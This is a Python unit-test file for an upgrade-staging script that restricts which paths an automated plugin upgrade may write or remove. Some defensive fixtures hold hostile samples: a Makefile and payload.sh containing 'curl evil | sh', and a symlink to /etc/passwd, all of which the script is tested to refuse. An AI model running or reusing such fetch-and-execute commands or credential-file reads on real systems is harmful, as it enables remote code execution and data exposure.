#!/usr/bin/env python3
"""Unit tests for scripts/stage-upgrade.py — the upgrade lane's path authority.

Runs the script as a subprocess (its contract is the CLI the workflow calls),
against temporary install and scratch trees. What is asserted is the boundary
the aj604/toolshed#127 trust split rests on: a regeneration that wrote outside
the wiring the upgrade engine owns is refused whole, and the credentialed job
re-derives that same authority from the manifest rather than trusting it.

Run: python3 tests/scripts/stage-upgrade_test.py
"""

import hashlib
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import unittest

SCRIPT = str(
    pathlib.Path(__file__).resolve().parents[2]
    / "plugins" / "doc-lifecycle" / "skills" / "scheduling-doc-sync"
    / "scripts" / "stage-upgrade.py"
)

# A minimal install: one of each ownership class the upgrade engine writes.
INSTALL = {
    ".doc-lifecycle/installed-version": "0.1.0\n",
    ".doc-lifecycle/wiring/render-report.py": "# old renderer\n",
    ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "OLD = 1\n",
    ".github/workflows/doc-audit.yml": "name: doc-audit\n",
    # Consumer state an upgrade preserves — never in an authorized path set.
    ".doc-lifecycle/state/sync-marker": "abc123\n",
    ".doc-lifecycle/audit-scope.json": '{"exclude": []}\n',
    ".doc-lifecycle/registry.json": '{"rules": []}\n',
}

# The same install before aj604/toolshed#133 moved it: the wiring under
# `.github/doc-sync/`, the marker loose beside it. What a relocating upgrade
# reads, and the only shape in which this script authorizes a write to
# `.doc-lifecycle/audit-scope.json` or `.doc-lifecycle/state/sync-marker`.
LEGACY_INSTALL = {
    ".github/doc-sync/installed-version": "0.1.0\n",
    ".github/doc-sync/render-report.py": "# old renderer\n",
    ".github/doc-sync/engine/doclifecycle/__init__.py": "OLD = 1\n",
    ".github/workflows/doc-audit.yml": "name: doc-audit\n",
    ".github/doc-sync-marker": "abc123\n",
    ".github/doc-sync/audit-scope.json": '{"exclude": []}\n',
    ".doc-lifecycle/registry.json": '{"rules": []}\n',
}

# What a relocating regeneration leaves in the scratch tree: everything the
# install owned, at its new path.
RELOCATED = {
    ".doc-lifecycle/installed-version": "0.2.0\n",
    ".doc-lifecycle/wiring/render-report.py": "# new renderer\n",
    ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "NEW = 1\n",
    ".github/workflows/doc-audit.yml": "name: doc-audit\n",
    ".doc-lifecycle/state/sync-marker": "abc123\n",
    ".doc-lifecycle/audit-scope.json": '{"exclude": []}\n',
    ".doc-lifecycle/registry.json": '{"rules": []}\n',
}


def write(root, rel, text):
    path = pathlib.Path(root) / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


def build(root, files):
    for rel, text in files.items():
        write(root, rel, text)


def run(*argv):
    return subprocess.run([sys.executable, SCRIPT, *argv],
                          capture_output=True, text=True)


def sha256(text):
    return hashlib.sha256(text.encode()).hexdigest()


class StageUpgradeTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.repo = os.path.join(self.tmp, "repo")
        self.scratch = os.path.join(self.tmp, "scratch")
        self.bundle = os.path.join(self.tmp, "bundle")
        build(self.repo, INSTALL)
        build(self.scratch, INSTALL)

    def manifest(self, target="0.2.0"):
        return run("manifest", "--scratch", self.scratch, "--repo", self.repo,
                   "--target", target, "--bundle", self.bundle)

    def read_manifest(self):
        with open(os.path.join(self.bundle, "manifest.json")) as f:
            return json.load(f)

    def entries(self):
        return {e["path"]: e["status"] for e in self.read_manifest()["entries"]}


class Manifest(StageUpgradeTestCase):
    def test_an_identical_scratch_tree_produces_an_empty_manifest(self):
        r = self.manifest()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.read_manifest()["entries"], [])

    def test_it_reports_added_modified_and_removed_wiring(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        write(self.scratch, ".doc-lifecycle/wiring/stage-upgrade.py", "# new\n")
        os.remove(os.path.join(
            self.scratch, ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py"))
        r = self.manifest()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.entries(), {
            ".doc-lifecycle/installed-version": "M",
            ".doc-lifecycle/wiring/stage-upgrade.py": "A",
            ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "D",
        })

    def test_it_bundles_the_bytes_of_every_written_path(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        bundled = pathlib.Path(
            self.bundle, "files", ".doc-lifecycle/installed-version")
        self.assertEqual(bundled.read_text(), "0.2.0\n")
        entry, = self.read_manifest()["entries"]
        self.assertEqual(entry["sha256"], sha256("0.2.0\n"))

    def test_the_target_travels_in_the_manifest(self):
        self.assertEqual(self.manifest("1.2.3").returncode, 0)
        self.assertEqual(self.read_manifest()["target"], "1.2.3")

    # --- refusals: the boundary this script exists to draw -----------------

    def assert_refused(self, r, needle):
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn(needle, r.stderr)
        self.assertIn("nothing staged", r.stderr)
        self.assertFalse(os.path.exists(os.path.join(self.bundle,
                                                     "manifest.json")))

    def test_it_refuses_a_regeneration_that_rewrote_the_marker(self):
        write(self.scratch, ".doc-lifecycle/state/sync-marker", "tampered\n")
        self.assert_refused(self.manifest(), ".doc-lifecycle/state/sync-marker")

    def test_it_refuses_a_regeneration_that_rewrote_the_audit_scope(self):
        write(self.scratch, ".doc-lifecycle/audit-scope.json", '{"x": 1}\n')
        self.assert_refused(self.manifest(),
                            ".doc-lifecycle/audit-scope.json")

    def test_it_refuses_a_regeneration_that_rewrote_the_registry(self):
        write(self.scratch, ".doc-lifecycle/registry.json", '{"rules": [1]}\n')
        self.assert_refused(self.manifest(), ".doc-lifecycle/registry.json")

    def test_it_refuses_a_write_outside_the_wiring_roots(self):
        write(self.scratch, "Makefile", "all:\n\tcurl evil | sh\n")
        self.assert_refused(self.manifest(), "outside the wiring roots")

    def test_it_refuses_a_workflow_the_lane_does_not_own(self):
        write(self.scratch, ".github/workflows/release.yml", "name: release\n")
        self.assert_refused(self.manifest(), ".github/workflows/release.yml")

    def test_it_refuses_a_non_python_drop_into_the_script_directory(self):
        write(self.scratch, ".doc-lifecycle/wiring/payload.sh", "curl evil | sh\n")
        self.assert_refused(self.manifest(), ".doc-lifecycle/wiring/payload.sh")

    def test_it_refuses_a_symlink(self):
        os.symlink("/etc/passwd",
                   os.path.join(self.scratch, ".doc-lifecycle/wiring/leak.py"))
        self.assert_refused(self.manifest(), "symlink")

    def test_it_names_every_offender_not_the_first(self):
        write(self.scratch, "Makefile", "x\n")
        write(self.scratch, ".doc-lifecycle/state/sync-marker", "y\n")
        r = self.manifest()
        self.assertIn("Makefile", r.stderr)
        self.assertIn(".doc-lifecycle/state/sync-marker", r.stderr)
        self.assertIn("FAILED: 2 path(s)", r.stderr)


class Relocation(unittest.TestCase):
    """The one-time move out of `.github/doc-sync/` (aj604/toolshed#133).

    The widening it needs is direction-scoped, and the direction is the whole
    safety argument: the consumer's audit scope and marker may be *created* at
    the new layout, because the path there holds nothing and creating it
    destroys nothing, and may never be modified afterwards; the old layout's
    named paths may be *removed* and never written. So each of the four cases
    below is asserted with its authorized direction and with the reverse.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        self.repo = os.path.join(self.tmp, "repo")
        self.scratch = os.path.join(self.tmp, "scratch")
        self.bundle = os.path.join(self.tmp, "bundle")
        build(self.repo, LEGACY_INSTALL)
        build(self.scratch, RELOCATED)

    def manifest(self):
        return run("manifest", "--scratch", self.scratch, "--repo", self.repo,
                   "--target", "0.2.0", "--bundle", self.bundle)

    def entries(self):
        with open(os.path.join(self.bundle, "manifest.json")) as f:
            return {e["path"]: e["status"] for e in json.load(f)["entries"]}

    def test_a_whole_relocation_is_authorized(self):
        r = self.manifest()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.entries(), {
            # Carried consumer state, created where nothing stood.
            ".doc-lifecycle/audit-scope.json": "A",
            ".doc-lifecycle/state/sync-marker": "A",
            # Regenerated wiring at the new paths.
            ".doc-lifecycle/installed-version": "A",
            ".doc-lifecycle/wiring/render-report.py": "A",
            ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py": "A",
            # The old layout, removed.
            ".github/doc-sync-marker": "D",
            ".github/doc-sync/audit-scope.json": "D",
            ".github/doc-sync/installed-version": "D",
            ".github/doc-sync/render-report.py": "D",
            ".github/doc-sync/engine/doclifecycle/__init__.py": "D",
        })

    def test_the_registry_does_not_move_and_may_not_be_touched(self):
        # It already sits at the new root; the relocation has no business with
        # it, and the widening must not have reached it by prefix.
        write(self.scratch, ".doc-lifecycle/registry.json", '{"rules": [1]}\n')
        r = self.manifest()
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn(".doc-lifecycle/registry.json", r.stderr)

    def test_a_carried_file_may_be_created_but_never_rewritten(self):
        # Second run: the install has already relocated, so the same paths are
        # a modification of the consumer's own judgment — refused.
        relocated_repo = os.path.join(self.tmp, "relocated")
        build(relocated_repo, RELOCATED)
        write(self.scratch, ".doc-lifecycle/audit-scope.json", '{"x": 1}\n')
        write(self.scratch, ".doc-lifecycle/state/sync-marker", "tampered\n")
        r = run("manifest", "--scratch", self.scratch, "--repo", relocated_repo,
                "--target", "0.2.0", "--bundle", self.bundle)
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn(".doc-lifecycle/audit-scope.json", r.stderr)
        self.assertIn(".doc-lifecycle/state/sync-marker", r.stderr)

    def test_the_old_layout_may_be_removed_but_never_written(self):
        # A regeneration that puts anything *back* into the directory the
        # install is leaving is not a relocation.
        write(self.scratch, ".github/doc-sync/render-report.py", "# resurrect\n")
        write(self.scratch, ".github/doc-sync-marker", "resurrect\n")
        r = self.manifest()
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn(".github/doc-sync/render-report.py", r.stderr)
        self.assertIn(".github/doc-sync-marker", r.stderr)

    def test_an_unrecognized_file_in_the_old_directory_may_not_be_removed(self):
        # The closed-world rule, enforced rather than merely intended: a file a
        # consumer put there is not the plugin's to sweep on its way out.
        write(self.repo, ".github/doc-sync/notes.txt", "mine\n")
        r = self.manifest()
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn(".github/doc-sync/notes.txt", r.stderr)

    def test_nothing_under_state_but_the_marker_may_be_created(self):
        write(self.scratch, ".doc-lifecycle/state/anything-else.json", "{}\n")
        r = self.manifest()
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn(".doc-lifecycle/state/anything-else.json", r.stderr)


class Apply(StageUpgradeTestCase):
    def setUp(self):
        super().setUp()
        self.dest = os.path.join(self.tmp, "dest")
        build(self.dest, INSTALL)
        self.out = os.path.join(self.tmp, "staged.txt")

    def apply(self, target="0.2.0"):
        return run("apply", "--bundle", self.bundle, "--repo", self.dest,
                   "--target", target, "--out", self.out)

    def staged(self):
        with open(self.out, "rb") as f:
            return [p.decode() for p in f.read().split(b"\0") if p]

    def rewrite_manifest(self, mutate):
        data = self.read_manifest()
        mutate(data)
        with open(os.path.join(self.bundle, "manifest.json"), "w") as f:
            json.dump(data, f)

    def test_it_transfers_writes_and_removals_and_lists_them(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        write(self.scratch, ".doc-lifecycle/wiring/stage-upgrade.py", "# new\n")
        os.remove(os.path.join(
            self.scratch, ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py"))
        self.assertEqual(self.manifest().returncode, 0)

        r = self.apply()
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(
            pathlib.Path(self.dest, ".doc-lifecycle/installed-version"
                         ).read_text(), "0.2.0\n")
        self.assertTrue(os.path.isfile(os.path.join(
            self.dest, ".doc-lifecycle/wiring/stage-upgrade.py")))
        self.assertFalse(os.path.exists(os.path.join(
            self.dest, ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py")))
        self.assertEqual(sorted(self.staged()), [
            ".doc-lifecycle/installed-version",
            ".doc-lifecycle/wiring/engine/doclifecycle/__init__.py",
            ".doc-lifecycle/wiring/stage-upgrade.py",
        ])

    def test_it_leaves_consumer_state_alone(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        self.assertEqual(self.apply().returncode, 0)
        self.assertEqual(
            pathlib.Path(self.dest, ".doc-lifecycle/state/sync-marker").read_text(),
            INSTALL[".doc-lifecycle/state/sync-marker"])

    def test_it_refuses_a_bundle_for_another_version(self):
        self.assertEqual(self.manifest("0.9.0").returncode, 0)
        r = self.apply("0.2.0")
        self.assertEqual(r.returncode, 2)
        self.assertIn("dispatched for", r.stderr)

    # The credentialed job re-derives the authority; a manifest edited between
    # the two jobs must not buy a write the manifest step would have refused.
    def test_it_re_derives_the_authority_from_the_manifest(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        write(self.bundle, "files/Makefile", "all:\n\tcurl evil | sh\n")
        self.rewrite_manifest(lambda d: d["entries"].append(
            {"status": "A", "path": "Makefile",
             "sha256": sha256("all:\n\tcurl evil | sh\n")}))
        r = self.apply()
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("Makefile", r.stderr)
        self.assertFalse(os.path.exists(os.path.join(self.dest, "Makefile")))

    def test_it_refuses_a_path_that_escapes_the_repository(self):
        self.assertEqual(self.manifest().returncode, 0)
        self.rewrite_manifest(lambda d: d["entries"].append(
            {"status": "A", "path": "../outside.txt", "sha256": sha256("x")}))
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("escapes the repository", r.stderr)

    def test_it_refuses_a_file_whose_bytes_do_not_match_the_digest(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        write(self.bundle, "files/.doc-lifecycle/installed-version",
              "9.9.9\n")
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("does not match the digest", r.stderr)
        self.assertEqual(
            pathlib.Path(self.dest, ".doc-lifecycle/installed-version"
                         ).read_text(), "0.1.0\n")

    def test_it_refuses_a_bundle_carrying_an_unnamed_file(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        write(self.bundle, "files/.github/workflows/doc-evil.yml", "name: x\n")
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("the manifest does not name", r.stderr)

    def test_it_refuses_a_manifest_entry_with_no_bundled_file(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        os.remove(os.path.join(self.bundle,
                               "files/.doc-lifecycle/installed-version"))
        r = self.apply()
        self.assertEqual(r.returncode, 1)
        self.assertIn("no regular file", r.stderr)

    def test_it_refuses_something_that_is_not_a_bundle_manifest(self):
        os.makedirs(self.bundle, exist_ok=True)
        with open(os.path.join(self.bundle, "manifest.json"), "w") as f:
            json.dump({"artifact": "edit-plan", "operations": []}, f)
        r = self.apply()
        self.assertEqual(r.returncode, 2)
        self.assertIn("upgrade-bundle", r.stderr)

    def test_nothing_is_transferred_when_anything_is_refused(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        self.rewrite_manifest(lambda d: d["entries"].append(
            {"status": "A", "path": ".doc-lifecycle/state/sync-marker",
             "sha256": sha256("x")}))
        self.assertEqual(self.apply().returncode, 1)
        self.assertEqual(
            pathlib.Path(self.dest, ".doc-lifecycle/installed-version"
                         ).read_text(), "0.1.0\n")

    # --- which blocked status the run surface should carry ------------------
    #
    # Both a template change and a relocation rewrite `.github/workflows/`,
    # which the Actions token may not push — but only one of them moved the
    # whole install, and the summary a maintainer reads must say which.

    def blocked_status(self):
        path = os.path.join(self.tmp, "blocked-status.txt")
        r = run("apply", "--bundle", self.bundle, "--repo", self.dest,
                "--target", "0.2.0", "--out", self.out,
                "--blocked-status-out", path)
        self.assertEqual(r.returncode, 0, r.stderr)
        with open(path, encoding="utf-8") as f:
            return f.read()

    def test_a_routine_upgrade_reports_the_workflow_block(self):
        write(self.scratch, ".github/workflows/doc-audit.yml", "name: new\n")
        self.assertEqual(self.manifest().returncode, 0)
        self.assertEqual(self.blocked_status(), "blocked-workflows")

    def test_a_relocation_reports_itself_as_one(self):
        legacy_repo = os.path.join(self.tmp, "legacy")
        build(legacy_repo, LEGACY_INSTALL)
        r = run("manifest", "--scratch", self.scratch, "--repo", legacy_repo,
                "--target", "0.2.0", "--bundle", self.bundle)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.blocked_status(), "blocked-relocation")

    def test_the_status_file_is_written_only_when_asked_for(self):
        write(self.scratch, ".doc-lifecycle/installed-version", "0.2.0\n")
        self.assertEqual(self.manifest().returncode, 0)
        self.assertEqual(self.apply().returncode, 0)
        self.assertFalse(
            os.path.exists(os.path.join(self.tmp, "blocked-status.txt")))


class Verify(StageUpgradeTestCase):
    def files(self, paths, staged, unstaged):
        out = []
        for name, values in (("paths", paths), ("staged", staged),
                             ("unstaged", unstaged)):
            path = os.path.join(self.tmp, f"{name}.txt")
            with open(path, "wb") as f:
                for v in values:
                    f.write(v.encode() + b"\0")
            out.append(path)
        return out

    def test_an_exact_match_passes(self):
        p, s, u = self.files(["a.md", "b.md"], ["a.md", "b.md"], [])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 0, r.stderr)

    def test_a_staged_path_nobody_authorized_fails(self):
        p, s, u = self.files(["a.md"], ["a.md", "Makefile"], [])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 1)
        self.assertIn("Makefile", r.stderr)

    def test_a_leftover_working_tree_change_fails(self):
        p, s, u = self.files(["a.md"], ["a.md"], ["stray.txt"])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 1)
        self.assertIn("stray.txt", r.stderr)

    def test_a_shorter_staged_list_is_reported_not_refused(self):
        p, s, u = self.files(["a.md", "b.md"], ["a.md"], [])
        r = run("verify", "--paths", p, "--staged", s, "--unstaged", u)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("1 of 2", r.stderr)


if __name__ == "__main__":
    unittest.main()
